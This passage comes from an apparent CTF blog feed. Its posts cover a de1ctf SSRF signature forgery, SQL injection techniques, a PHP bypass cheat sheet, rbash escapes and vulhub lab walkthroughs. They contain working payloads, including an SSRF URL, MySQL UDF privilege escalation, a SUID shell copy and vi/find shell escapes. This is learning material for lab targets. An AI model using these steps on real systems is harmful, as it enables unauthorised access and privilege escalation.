class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> resp</span><br><span class="line">                tmpfile.write(resp)</span><br><span class="line">                tmpfile.close()</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> <span class="variable language_">self</span>.action:</span><br><span class="line">            f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % <span class="variable language_">self</span>.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">        <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>在进入两个action之前，需要绕过checkSign函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">if</span> (getSign(<span class="variable language_">self</span>.action, <span class="variable language_">self</span>.param) == <span class="variable language_">self</span>.sign):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>action和param通过getSign加密后的值与sign比较</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure><p>一个md5函数的加密，查看全局，发现/geneSign页面调用了这个函数进行return输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br></pre></td></tr></table></figure><p>param=flag.txtread传入获取对应的sign值</p><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/flask_ssrf1.png" alt="flask_ssrf1"></p><p>getSign获得的值是：</p><p>md5(secert_key+flag.txtread+scan)</p><p>回到/De1ta页面</p><p>param=flag.txt</p><p>cookie:</p><p>action=readsan</p><p>sign=7cde191de87fe3ddac26e19acae1525e</p><p>传到checkSign进入getSign看看是怎么加密的：</p><p>md5(secert_key+param + action)</p><p>=</p><p>md5(secert_key+flag.txt  + readscan)</p><p>完全吻合上面获得的值，将他作为sign输入去比对</p><p>（注:1.scan和read函数都会运行，都是两个if语句2.if .. in .. 字符串传入即可）</p><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/flask_ssrf2.png" alt="flask_ssrf2"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;de1tactf2019-ssrf-me&quot;&gt;&lt;a href=&quot;#de1tactf2019-ssrf-me&quot; class=&quot;headerlink&quot; title=&quot;de1tactf2019_ssrf_me&quot;&gt;&lt;/a&gt;de1tactf2019_ssrf_me&lt;/h1&gt;&lt;</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://iloveflag.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>sql注入</title>
    <link href="https://iloveflag.github.io/2019/07/13/sql%E6%B3%A8%E5%85%A5/"/>
    <id>https://iloveflag.github.io/2019/07/13/sql%E6%B3%A8%E5%85%A5/</id>
    <published>2019-07-13T13:39:15.000Z</published>
    <updated>2025-02-14T14:45:19.318Z</updated>
    
    <content type="html"><![CDATA[<h1 id="联合查询与order-by"><a href="#联合查询与order-by" class="headerlink" title="联合查询与order by"></a>联合查询与order by</h1><h1 id="盲注Blind-SQL-Injections"><a href="#盲注Blind-SQL-Injections" class="headerlink" title="盲注Blind SQL Injections"></a>盲注Blind SQL Injections</h1><p>About Blind SQL Injections<br>In a quite good production application generally you can not see error responses on the page, so you can not extract data through Union attacks or error based attacks. You have to do use Blind SQL Injections attacks to extract data. There are two kind of Blind Sql Injections.</p><p>Normal Blind, You can not see a response in the page, but you can still determine result of a query from response or HTTP status code<br>Totally Blind, You can not see any difference in the output in any kind. This can be an injection a logging function or similar. Not so common, though.<br>当不能直接通过显示数据来获得数据库数据时，需要使用其他方式判断或者尝试，这个过程就是盲注。</p><h2 id="基于布尔盲注-根据页面返回内容判断"><a href="#基于布尔盲注-根据页面返回内容判断" class="headerlink" title="基于布尔盲注(根据页面返回内容判断)"></a>基于布尔盲注(根据页面返回内容判断)</h2><p>MySQL If Statement<br>IF(condition,true-part,false-part) (M)<br>SELECT IF(1=1,’true’,’false’)</p><p>Using CONCAT() in MySQL<br>SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77)) (M)<br>This will return ‘KLM’.</p><p>　HAVING  配合 GROUP BY 使用，对分组后的数据进行限制,可以使用聚合函数。<br>　‘ GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 —</p><h2 id="基于时间盲注-根据页面响应时间判断"><a href="#基于时间盲注-根据页面响应时间判断" class="headerlink" title="基于时间盲注(根据页面响应时间判断)"></a>基于时间盲注(根据页面响应时间判断)</h2><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p>Basically, you put an SQL Injection to some place and expect it’s unfiltered in another action. This is common hidden layer problem.</p><p>Name : ‘ + (SELECT TOP 1 password FROM users ) + ‘<br>Email : xx@xx.com</p><p>If application is using name field in an unsafe stored procedure or function, process etc. then it will insert first users password as your name etc.</p><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p><a href="https://www.iloveflag.com/23//?p=303/">宽字节注入</a></p><h1 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h1><p>堆叠查询是指可以在单次数据库连接中，执行多个查询序列。简单的来说就是执行多条语句。</p><h1 id="xff注入"><a href="#xff注入" class="headerlink" title="xff注入"></a>xff注入</h1><h1 id="usr-agent-html注入"><a href="#usr-agent-html注入" class="headerlink" title="usr_agent html注入"></a>usr_agent html注入</h1><h1 id="json注入"><a href="#json注入" class="headerlink" title="json注入"></a>json注入</h1><p><a href="https://data.hackinn.com/ppt/CIS2019/Hack%20Lab论坛/Web漏洞挖掘速成特训营.pdf">Web漏洞挖掘速成特训营.pdfWeb漏洞挖掘速成特训营.pdf</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;联合查询与order-by&quot;&gt;&lt;a href=&quot;#联合查询与order-by&quot; class=&quot;headerlink&quot; title=&quot;联合查询与order by&quot;&gt;&lt;/a&gt;联合查询与order by&lt;/h1&gt;&lt;h1 id=&quot;盲注Blind-SQL-Injection</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://iloveflag.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>快速查询整理</title>
    <link href="https://iloveflag.github.io/2019/07/12/%E5%BF%AB%E9%80%9F%E6%9F%A5%E8%AF%A2%E6%95%B4%E7%90%86/"/>
    <id>https://iloveflag.github.io/2019/07/12/%E5%BF%AB%E9%80%9F%E6%9F%A5%E8%AF%A2%E6%95%B4%E7%90%86/</id>
    <published>2019-07-11T16:56:32.000Z</published>
    <updated>2025-02-14T14:45:19.323Z</updated>
    
    <content type="html"><![CDATA[<h1 id="快速查询整理"><a href="#快速查询整理" class="headerlink" title="快速查询整理"></a>快速查询整理</h1><h2 id="文件泄漏"><a href="#文件泄漏" class="headerlink" title="文件泄漏"></a>文件泄漏</h2><p>.git</p><p>.svn</p><p>.DS_STOR</p><p>vim泄漏  .index.php.swp</p><p>常见web文件泄漏：</p><p>index.php~</p><p>index.phps</p><p>www.zip</p><p>www.tar.gz</p><h2 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h2><p><strong>strcmp</strong>：比较函数，<strong>数组绕过</strong></p><p><strong>extract</strong>：从用户可以控制的数组中导出变量时导致<strong>变量覆盖</strong></p><p><strong>parse_str</strong>：函数去变量解析存在带入未初始化的数据，可以进行url编码，<strong>变量覆盖漏洞</strong></p><p><strong>intval</strong>：取整函数绕过，<strong>payload:id=1024.1</strong></p><p><strong>ereg</strong>:<strong>%00截断</strong></p><p><strong>addslashes</strong>：宽字节注入%df吃掉 \</p><p><strong>XFF</strong>：X-Forwarded-For: client1, proxy1, proxy2</p><p><strong>进制比较</strong>：16进制转换</p><p><strong>curl与parse_url结合ssrf</strong></p><p>文献：<a href="https://www.anquanke.com/post/id/86527">https://www.anquanke.com/post/id/86527</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$match_result</span>=<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error1&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$url_parse</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$ip</span>=<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$hostname</span>);</span><br><span class="line">    <span class="variable">$int_ip</span>=<span class="title function_ invoke__">ip2long</span>(<span class="variable">$ip</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;0.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">check_inner_ip</span>(<span class="variable">$url</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="variable">$result_info</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$output</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//hint23333:</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="comment">//phpinfo in phpinfo.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">//payload：http://Str3am@127.0.0.1:80 @www.baidu.com/flag.php</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/curl_and_parse_url.png" alt="curl_and_parse_url.png"></p><p><strong>0E开头的两个字符串</strong>弱比较:</p><p>md5:</p><p><code>QNKCDZO</code><br><code>240610708</code><br><code>s878926199a</code><br><code>s155964671a</code><br><code>s214587387a</code><br><code>s214587387a</code></p><p>sha1:<br><code>aaroZmOk</code><br><code>aaK1STfY</code><br><code>aaO8zKZF</code><br><code>aa3OFF9m</code></p><h2 id="常见技巧"><a href="#常见技巧" class="headerlink" title="常见技巧"></a>常见技巧</h2><p>php的两个<strong>伪协议</strong>:</p><p>php://input POST原生数据</p><p>文件读取file=php://filter/read=convert.base64-encode/resource=index.php</p><p>php伪随机数安全：php_mt_seed工具</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><p>明文攻击</p><p>crc32爆破</p><p>pkcrack参数：</p><ul><li><p>C : 要破解的目标文件（含路径）</p><p>  c ：破解文件中的明文文件的名字（其路径不包括系统路径，从zip文件一层开始）</p><p>  P ：压缩后的明文文件</p><p>  p : 压缩的明文文件中明文文件的名字（也就是readme.txt在plain.zip中的位置）</p><p>  d : 最后得到的没有加密的zip文件</p></li></ul><hr><p>lsb隐写</p><p>F5隐写</p><p>最低位隐写</p><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/%E5%9B%BE%E7%89%87%E9%AB%98%E5%BA%A6%E9%97%AE%E9%A2%98.jpg" alt="图片高度问题.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;快速查询整理&quot;&gt;&lt;a href=&quot;#快速查询整理&quot; class=&quot;headerlink&quot; title=&quot;快速查询整理&quot;&gt;&lt;/a&gt;快速查询整理&lt;/h1&gt;&lt;h2 id=&quot;文件泄漏&quot;&gt;&lt;a href=&quot;#文件泄漏&quot; class=&quot;headerlink&quot; title=&quot;文</summary>
      
    
    
    
    
    <category term="rubbish" scheme="https://iloveflag.github.io/tags/rubbish/"/>
    
  </entry>
  
  <entry>
    <title>rbash逃逸</title>
    <link href="https://iloveflag.github.io/2019/06/15/rbash%E9%80%83%E9%80%B8/"/>
    <id>https://iloveflag.github.io/2019/06/15/rbash%E9%80%83%E9%80%B8/</id>
    <published>2019-06-14T22:12:51.000Z</published>
    <updated>2025-02-14T14:45:19.317Z</updated>
    
    <content type="html"><![CDATA[<h1 id="restricted-shell-与rbash"><a href="#restricted-shell-与rbash" class="headerlink" title="restricted shell 与rbash"></a>restricted shell 与rbash</h1><p>什么是restricted shell？顾名思义是一个受限的shell，让用户只能执行一些网络管理员允许执行的命令，极大地控制了用户的权限，可分为<br>rbash（The restricted mode of bash）<br>ksh（Similarly the Korn shell’s restricted mode）<br>rsh（The restricted mode of the Bourne shell sh）<br>下面以rbash展开<br>rbash是一个bash -r的软连接，可以rbash进入或者bash -r直接进入</p><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/rbash01.png" alt="rbash01"></p><h1 id="rbash的配置"><a href="#rbash的配置" class="headerlink" title="rbash的配置"></a>rbash的配置</h1><p>在研究rbash逃逸之前，更应该先了解如何配置一个使特定用户只能使用rbash的环境<br>在红帽系的linux中默认没有rbash，需要先创建一个软链接，以centos7配置为例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[root@localhost ~]# ln -s /bin/bas /bin/rbash</span><br><span class="line">[root@localhost ~]# useradd -s /bin/rbash test</span><br><span class="line">[root@localhost ~]# cd /home/test/</span><br><span class="line">[root@localhost test]# mkdir  bin</span><br><span class="line">[root@localhost test]# vi .bash_profile</span><br><span class="line">[root@localhost test]# cat .bash_profile</span><br><span class="line"># .bash_profile</span><br><span class="line"></span><br><span class="line"># Get the aliases and functions</span><br><span class="line">if [ -f ~/.bashrc ]; then</span><br><span class="line">        . ~/.bashrc</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># User specific environment and startup programs</span><br><span class="line"></span><br><span class="line">PATH=$PATH:$HOME/bin</span><br><span class="line"></span><br><span class="line">export PATH</span><br><span class="line">[root@localhost test]# ln -s /usr/bin/vi bin/</span><br><span class="line">[root@localhost test]# ln -s /usr/bin/scp bin/</span><br><span class="line">[root@localhost test]# passwd test</span><br><span class="line">Changing password for user test.</span><br><span class="line">New password:</span><br><span class="line">BAD PASSWORD: The password is shorter than 8 characters</span><br><span class="line">Retype new password:</span><br><span class="line">passwd: all authentication tokens updated successfully.</span><br></pre></td></tr></table></figure><p>将允许用户使用的命令通过软链接形式复制到家目录的bin下<br>注意：请直接登录test用户或者使用ssh验证rbash生效，在root用户下su test切换验证无效</p><h1 id="rbash逃逸"><a href="#rbash逃逸" class="headerlink" title="rbash逃逸"></a>rbash逃逸</h1><p>下面复现几个实战和ctf中常见的逃逸</p><h2 id="Find"><a href="#Find" class="headerlink" title="Find:"></a>Find:</h2><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/rbash02.png" alt="rbash02"></p><h2 id="Python"><a href="#Python" class="headerlink" title="Python:"></a>Python:</h2><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/rbash03.png" alt="rbash03"></p><h2 id="Awk："><a href="#Awk：" class="headerlink" title="Awk："></a>Awk：</h2><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/rbash04.png" alt="rbash04"></p><h2 id="vi："><a href="#vi：" class="headerlink" title="vi："></a>vi：</h2><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/rbash05.png" alt="rbash05"></p><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/rbash06.png" alt="rbash06"></p><p>想了解更多？<br>(<a href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf">https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf</a>)</p><h1 id="rbash逃逸实战"><a href="#rbash逃逸实战" class="headerlink" title="rbash逃逸实战"></a>rbash逃逸实战</h1><p>以vulhub.com上的DC-2为例<br>在cewl生成字典和wpscan配合爆出对应的用户名和密码后</p><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/rbash07.png" alt="rbash07"></p><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/rbash08.png" alt="rbash08"></p><p>发现shell是rbash，使用自动补全命令compgen -c可以看到我们能使用vi<br>利用vi提权<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><br>更改PATH（从前面的配置过程可以看出实际对应的是家目录下的.bash_ profile文件）<br>export PATH=$PATH:/bin:/usr/bin</p><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/rbash09.png" alt="rbash09"></p><p>登录到jerry，使用git提权<br>复制/bin/sh 到/tmp目录下<br>!/bin/sh -c “cp /bin/sh /tmp/test.sh;chmod 4755 /tmp/test.sh”</p><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/rbash10.png" alt="rbash10"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;restricted-shell-与rbash&quot;&gt;&lt;a href=&quot;#restricted-shell-与rbash&quot; class=&quot;headerlink&quot; title=&quot;restricted shell 与rbash&quot;&gt;&lt;/a&gt;restricted shell </summary>
      
    
    
    
    
    <category term="ctf" scheme="https://iloveflag.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>vulhub-learning</title>
    <link href="https://iloveflag.github.io/2019/05/23/vulhub-learning/"/>
    <id>https://iloveflag.github.io/2019/05/23/vulhub-learning/</id>
    <published>2019-05-22T20:56:20.000Z</published>
    <updated>2025-02-14T14:45:19.319Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Raven1"><a href="#Raven1" class="headerlink" title="Raven1"></a>Raven1</h1><p>1.利用python打开一个shell终端：<br>sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’<br>3.udf提取<br>gcc -g -c 1518.c<br>gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc<br>create table foo(line blob);<br>insert into foo values(load_file(‘/var/www/html/1518.so’));<br>select <em> from foo into dumpfile ‘/usr/lib/mysql/plugin/1518.so’;<br>create function do_system returns integer soname ‘1518.so’;<br>select </em> from mysql.func;<br>select do_system(‘chmod u+s /usr/bin/find’);<br>回到终端用find命令提权：<br>touch foo<br>find foo -exec ‘/bin/sh’ \;</p><h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1><p>1.快速找包含flag的文件<br>find / -name “<em>flag</em>“ 2&gt;/dev/null<br> 2&gt;/dev/null的意思为隐藏错误信息<br>2.利用find命令找到有权限的二进制文件<br>find / -perm -4000 2&gt; /dev/null</p><h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><p>nmap 扫描发现只有80端口开着，是wordpress框架<br>wpscan扫描得到三个用户，用字典爆破无果<br>发现提示cewl，通过搜集网站关键字生成字典<br>然后wpscan爆破得到帐号密码<br> wpscan —url <a href="http://dc-2">http://dc-2</a> -e u -P password.txt<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/vulhub-dc-2.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Raven1&quot;&gt;&lt;a href=&quot;#Raven1&quot; class=&quot;headerlink&quot; title=&quot;Raven1&quot;&gt;&lt;/a&gt;Raven1&lt;/h1&gt;&lt;p&gt;1.利用python打开一个shell终端：&lt;br&gt;sudo python -c ‘import pty;p</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://iloveflag.github.io/tags/ctf/"/>
    
  </entry>
  
</feed>
